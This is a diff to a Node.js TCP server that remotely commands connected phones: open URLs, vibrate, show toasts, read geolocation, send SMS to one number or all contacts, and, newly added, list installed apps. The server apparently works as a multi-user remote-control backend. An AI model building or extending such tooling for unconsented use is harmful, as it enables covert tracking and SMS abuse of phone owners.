@@ -113,7 +113,8 @@ const getSafeUserByDeviceId = async (portname, devid, callback = () => {}) => {
                 callback({
                     status: true,
                     user: user,
-                    method: "getUserByDeviceId"
+                    method: "getUserByDeviceId",
+                    device_id: devid
                 });
                 return;
             }
@@ -121,7 +122,8 @@ const getSafeUserByDeviceId = async (portname, devid, callback = () => {}) => {
         callback({
             status: false,
             method: "getUserByDeviceId",
-            message: "USER_NOT_FOUND"
+            message: "USER_NOT_FOUND",
+            device_id: devid
         });
     })
 }
@@ -140,7 +142,8 @@ const openUrl = async (portname, passname, devid, url, callback = () => {}) => {
             callback({
                 status: false,
                 method: "openUrl",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -171,6 +174,13 @@ const openUrl = async (portname, passname, devid, url, callback = () => {}) => {
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
@@ -190,7 +200,8 @@ const vibratePhone = async (portname, passname, devid, callback = () => {}) => {
             callback({
                 status: false,
                 method: "vibratePhone",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -218,6 +229,13 @@ const vibratePhone = async (portname, passname, devid, callback = () => {}) => {
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
@@ -238,7 +256,8 @@ const sendToast = async (portname, passname, devid, toast, callback = () => {}) 
             callback({
                 status: false,
                 method: "sendToast",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -269,6 +288,13 @@ const sendToast = async (portname, passname, devid, toast, callback = () => {}) 
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
@@ -289,7 +315,8 @@ const getGeoLocation = async (portname, passname, devid, callback = () => {}) =>
             callback({
                 status: false,
                 method: "getGeoLocation",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -308,16 +335,25 @@ const getGeoLocation = async (portname, passname, devid, callback = () => {}) =>
                             status: true,
                             method: "getGeoLocation",
                             longitude: _message.longitude,
-                            latitude: _message.latitude
+                            latitude: _message.latitude,
+                            device_id: devid
                         });
                         return;
                     } else {
                         callback({
                             status: false,
-                            method: "getGeoLocation"
+                            method: "getGeoLocation",
+                            device_id: devid
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
@@ -338,7 +374,8 @@ const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) =
             callback({
                 status: false,
                 method: "sendSMSAll",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -367,6 +404,13 @@ const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) =
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
@@ -387,7 +431,8 @@ const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () =
             callback({
                 status: false,
                 method: "sendSMS",
-                message: "USER_NOT_FOUND"
+                message: "USER_NOT_FOUND",
+                device_id: devid
             });
             return;
         }
@@ -419,9 +464,64 @@ const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () =
                         });
                         return;
                     }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
                 }
             }
         })
+    })
+}
+
+const getInstalledApps = async (portname, passname, devid, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (!user.status){
+            user.device_id = devid;
+            callback(user);
+            return;
+        }
+
+        user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "getInstalledApps"
+        }));
+
+        user.socket.on("data", async (data) => {
+            let _message = JSON.parse(data.toString());
+            if (_message.method == "getInstalledApps"){
+                if (_message.port == portname && _message.password == passname){
+                    if (_message.status == true){
+                        callback({
+                            status: true,
+                            method: "getInstalledApps",
+                            apps: _message.apps,
+                            device_id: devid
+                        });
+                        return;
+                    } else {
+                        callback({
+                            status: false,
+                            method: "getInstalledApps",
+                            device_id: devid
+                        });
+                        return;
+                    }
+                } else {
+                    user.socket.write(JSON.stringify({
+                        status: false,
+                        method: _message.method,
+                        message: "INVALID_PORT_OR_PASSWORD",
+                        device_id: devid
+                    }));
+                }
+            }
+        })
+
     })
 }
 
@@ -437,7 +537,8 @@ const server = net.createServer(async (socket) => {
                                 socket.write(JSON.stringify({
                                     status: false,
                                     message: "INVALID_PORT_OR_PASSWORD",
-                                    method: message.method
+                                    method: message.method,
+                                    device_id: message.device_id
                                 }));
                                 return;
                             }
@@ -446,7 +547,8 @@ const server = net.createServer(async (socket) => {
                                 socket.write(JSON.stringify({
                                     status: false,
                                     message: "YOU_BANNED",
-                                    method: message.method
+                                    method: message.method,
+                                    device_id: message.device_id
                                 }));
                                 return;
                             }
@@ -512,7 +614,8 @@ const server = net.createServer(async (socket) => {
                     socket.write(JSON.stringify({
                         status: false,
                         method: Object.keys(message).includes("method") ? message.method : "error",
-                        message: "PORT_AND_PASSWORD_NOT_FOUND"
+                        message: "PORT_AND_PASSWORD_NOT_FOUND",
+                        device_id: message.device_id
                     }));
                     return;
                 }
